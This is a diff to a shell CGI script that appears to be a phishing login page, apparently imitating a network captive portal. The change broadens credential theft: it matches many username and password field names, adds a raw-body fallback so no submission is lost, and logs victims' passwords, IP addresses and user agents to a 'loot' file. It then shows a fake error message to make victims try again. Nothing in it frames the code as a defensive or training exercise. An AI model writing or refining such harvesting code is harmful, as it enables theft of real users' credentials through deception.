@@ -13,10 +13,14 @@ if [ "$REQUEST_METHOD" = "POST" ]; then
   B=$(dd bs=1 count="${CONTENT_LENGTH:-0}" 2>/dev/null)
   # field split on & then = - raw values stay raw (URL-encoding preserved
   # verbatim in loot: %40 etc. decode later, never mangle the capture)
-  USER_=$(echo "$B" | tr '&' '\n' | grep '^user=' | head -1 | cut -d= -f2-)
-  PASS_=$(echo "$B" | tr '&' '\n' | grep '^pass=' | head -1 | cut -d= -f2-)
+  # field-split on &, then =; accept the common login-field variants so a
+  # nonstandard form still lands; RAW fallback guarantees nothing is ever lost.
+  USER_=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(user|username|email|login|account)=' | cut -d= -f2-)
+  PASS_=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(pass|password|pwd|pin)=' | cut -d= -f2-)
+  RAWB=""
+  [ -z "$USER_" ] && [ -z "$PASS_" ] && RAWB="|raw=$(echo "$B" | tr -c 'A-Za-z0-9%&=._@:-' '?' | cut -c1-240)"
   TS=$(date -u +%FT%TZ)
-  echo "POST |$TS|ra=$REMOTE_ADDR|ua=$U|user=$USER_|pass=$PASS_|host=$HTTP_HOST" >> "$LOOTLOG" 2>/dev/null
+  echo "POST |$TS|ra=$REMOTE_ADDR|ua=$U|user=$USER_|pass=$PASS_|host=$HTTP_HOST" $RAWB >> "$LOOTLOG" 2>/dev/null
   NAME=$(echo "$USER_" | sed 's/%40/@/g; s/+/_/g' | cut -c1-40)
   MSG="We couldn&#39;t verify those details with the network directory. Please check your password and try again, or contact your front desk."
 fi
